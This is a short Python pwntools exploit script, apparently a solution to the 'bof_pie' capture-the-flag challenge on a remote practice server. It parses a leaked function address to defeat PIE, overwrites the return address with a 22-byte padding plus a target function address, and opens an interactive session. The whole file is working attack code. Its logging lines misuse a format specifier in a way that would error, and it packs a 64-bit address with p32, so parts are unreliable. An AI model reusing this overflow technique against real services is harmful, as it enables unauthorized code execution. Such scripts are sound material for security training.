from pwn import *
import sys

def exploit():
	welcome_offset = 0x909
	j0n9hyun_offset = 0x890
	print p.recvuntil("?")
	welcome_addr = int(p.recv(22)[14:], 16)

	log.info("welcome_addr: 0x%x"%hex(welcome_addr))

	base_addr = welcome_addr - welcome_offset
	j0n9hyun_addr = base_addr + j0n9hyun_offset

	log.info("base_addr: 0x%x"%hex(base_addr))
	log.info("j0n9hyun_addr: 0x%x"%hex(j0n9hyun_addr))

	payload = 'A'*22
	payload += p32(j0n9hyun_addr)

	p.sendline(payload)
	p.interactive()
def main():
	global b, l, elf, p

	# context.log_level = 'debug'
	context.arch = 'amd64'

	b   = './bof_pie'
	elf = ELF(b)
	l = elf.libc
	#p   = process(b)
	# p = process(b, env={'LD_PRELOAD' : l})
	p = remote('ctf.j0n9hyun.xyz', 3008)
	exploit()

if __name__ == '__main__':
	main()